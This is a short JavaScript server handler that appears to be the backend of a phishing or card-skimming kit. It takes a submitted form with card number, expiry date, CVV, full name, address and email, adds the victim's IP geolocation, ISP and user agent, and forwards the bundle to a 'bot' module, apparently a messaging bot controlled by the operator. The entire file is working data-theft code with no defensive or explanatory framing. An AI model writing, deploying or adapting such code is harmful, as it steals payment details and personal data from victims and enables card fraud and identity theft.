const bot = require("./bot.js")
const dotenv = require("dotenv")
dotenv.config()
const axios = require("axios");
const ipObject = require("./middleware/clientip")

const info = (form) => `
firstName: ${form.firstName},
lastName: ${form.LastName},
cardNumber: ${form.cardNumber},
cardExp: ${form.CardExp},
cardCvv: ${form.cardCvv},
fullName: ${form.fullName},
address: ${form.address},
city: ${form.city},
state: ${form.state},
zip: ${form.zip},
email: ${form.email},
`;


const botString = (geo) => ` 
ip: ${geo.ip}
state_prov: ${geo.state_prov},       
district: ${geo.district}
city: ${geo.city}
zipcode: ${geo.zipcode}
country_name: ${geo.country_name}
latitude: ${geo.latitude}
longitude: ${geo.longitude}
isp: ${geo.isp}
organization: ${geo.organization}
User-Agent : ${geo.ua}
`;

const geoloc = axios.create({
    baseURL : 'https://api.ipgeolocation.io/ipgeo',
    timeout : 10000,
    params : { 
      apiKey : process.env.API_IPGEO , 
      fields : "geo,isp,asn,hostname,organization,zipcode",
      excludes: "country_code2,country_code3"
    }
  })

export default async function handler(req, res) {
    const { data } = await geoloc.get("" , {
          ip : req.client.ip
        })
        const geo = data
        geo.ua = req.client.ua
        const packed = `
        ${info(req.body)}
        ${botString(geo)}
        `
        bot(packed)
    res.status(200)
  }
  